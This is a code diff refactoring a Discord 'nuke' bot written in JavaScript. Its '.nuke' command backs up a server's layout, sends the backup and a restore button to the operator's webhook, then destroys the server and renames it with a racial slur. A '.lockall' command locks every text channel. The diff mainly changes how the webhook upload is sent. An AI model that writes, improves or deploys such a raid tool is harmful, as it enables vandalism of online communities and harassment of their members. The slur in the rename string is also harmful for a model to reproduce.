@@ -1,6 +1,7 @@
 const { Client, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } = require('discord.js');
 const http = require('http');
-const https = require('https'); // for downloading attachment from webhook message
+const https = require('https');
+const FormData = require('form-data');
 
 const client = new Client({ intents: [1, 512, 32768, 2, 16] });
 
@@ -20,10 +21,10 @@ http.createServer((req, res) => {
 client.once('ready', () => console.log(`[+] ${client.user.tag} ready`));
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
-// Backup helpers (unchanged)
+// Backup helpers
 async function backupGuild(guild) {
     const channels = guild.channels.cache.sort((a, b) => a.position - b.position);
-    const data = {
+    return {
         name: guild.name,
         channels: channels.map(ch => ({
             name: ch.name,
@@ -38,7 +39,6 @@ async function backupGuild(guild) {
             }))
         }))
     };
-    return data;
 }
 
 async function restoreGuild(guild, backup) {
@@ -87,43 +87,35 @@ async function restoreGuild(guild, backup) {
     }
 }
 
-// Webhook send with file attachment
+// Webhook send with file attachment (backup.json)
 async function sendWebhookWithBackup(backup, guildId, originalName, username, time) {
-    const formData = new FormData();
+    const form = new FormData();
     
-    // Embed
     const embed = new EmbedBuilder()
         .setTitle('Server Nuked')
         .setDescription(`**Name:** ${originalName}\n**By:** ${username}\n**Time:** ${time}`)
         .setColor(0xff0000);
     
-    // Button
     const button = new ButtonBuilder()
         .setCustomId(`restore_${guildId}`)
         .setLabel('Restore Server')
         .setStyle(ButtonStyle.Success);
     const row = new ActionRowBuilder().addComponents(button);
 
-    // Payload JSON object
     const payload = {
         content: '**Server Nuked**',
         embeds: [embed.toJSON()],
         components: [row.toJSON()]
     };
 
-    // Append payload as a string field
-    formData.append('payload_json', JSON.stringify(payload));
-    
-    // Backup file
+    form.append('payload_json', JSON.stringify(payload));
     const backupJson = JSON.stringify(backup, null, 2);
-    const buffer = Buffer.from(backupJson, 'utf-8');
-    formData.append('files[0]', buffer, `backup-${guildId}.json`);
+    form.append('files[0]', Buffer.from(backupJson, 'utf-8'), `backup-${guildId}.json`);
 
-    // Send via fetch
     await fetch(LOG_WEBHOOK, {
         method: 'POST',
-        body: formData,
-        headers: formData.getHeaders ? formData.getHeaders() : undefined
+        body: form,
+        headers: form.getHeaders()
     });
 }
 
@@ -143,7 +135,7 @@ client.on('messageCreate', async (message) => {
         return;
     }
 
-    // Protected server
+    // Protected server guard
     if (isProtected && !isOwner && cmd !== '.panel' && cmd !== '.extpanel') {
         if (message.content.startsWith('.')) return message.reply('Server protected').catch(() => {});
         return;
@@ -165,7 +157,7 @@ client.on('messageCreate', async (message) => {
         return message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
     }
 
-    // .nuke
+    // .nuke – backup, webhook with restore button, then destroy
     if (cmd === '.nuke') {
         if (isProtected) return message.reply('Server protected').catch(() => {});
         await message.delete().catch(() => {});
@@ -177,8 +169,8 @@ client.on('messageCreate', async (message) => {
         // 1. Backup
         const backup = await backupGuild(g);
 
-        // 2. Send webhook with embed, button, and backup file
-        await sendWebhookWithBackup(backup, g.id, originalName, username, time);
+        // 2. Send webhook with embed, button, and backup.json (fire and forget)
+        sendWebhookWithBackup(backup, g.id, originalName, username, time).catch(() => {});
 
         // 3. Nuke
         await g.setName('NGA GOT NUKED BY JHUB').catch(() => {});
@@ -203,7 +195,7 @@ client.on('messageCreate', async (message) => {
     if (cmd === '.lockall') { let c = 0; for (const [, ch] of message.guild.channels.cache) { if (ch.type === 0) { ch.permissionOverwrites.create(message.guild.roles.everyone, { SendMessages: false }).catch(() => {}); c++; await sleep(100); } } message.reply(`Locked ${c} channels`).catch(() => {}); return; }
 });
 
-// Interaction handler for restore button (and cmds list)
+// Interaction handler for buttons (restore + cmds list)
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isButton()) return;
 
@@ -220,26 +212,23 @@ client.on('interactionCreate', async (interaction) => {
         if (interaction.user.id !== OWNER_ID) 
             return interaction.reply({ content: 'Only the bot owner can restore.', ephemeral: true });
 
-        // Defer reply while we process
         await interaction.deferReply({ ephemeral: true });
 
         const guild = client.guilds.cache.get(guildId);
         if (!guild) return interaction.editReply('Server not found. Bot may have been kicked.');
 
-        // Get the backup file from the webhook message
         const msg = interaction.message;
         const attachment = msg.attachments.first();
         if (!attachment || !attachment.name.endsWith('.json')) 
             return interaction.editReply('No backup file found on this message.');
 
         try {
-            // Download attachment
             const backupText = await fetch(attachment.url).then(r => r.text());
             const backup = JSON.parse(backupText);
 
-            // Restore
             await restoreGuild(guild, backup);
-            // Disable the button
+
+            // Disable the restore button
             const disabledRow = new ActionRowBuilder().addComponents(
                 new ButtonBuilder()
                     .setCustomId('restored')
@@ -248,6 +237,7 @@ client.on('interactionCreate', async (interaction) => {
                     .setDisabled(true)
             );
             await interaction.message.edit({ components: [disabledRow] }).catch(() => {});
+
             await interaction.editReply('Server restored successfully!');
         } catch (e) {
             console.error(e);
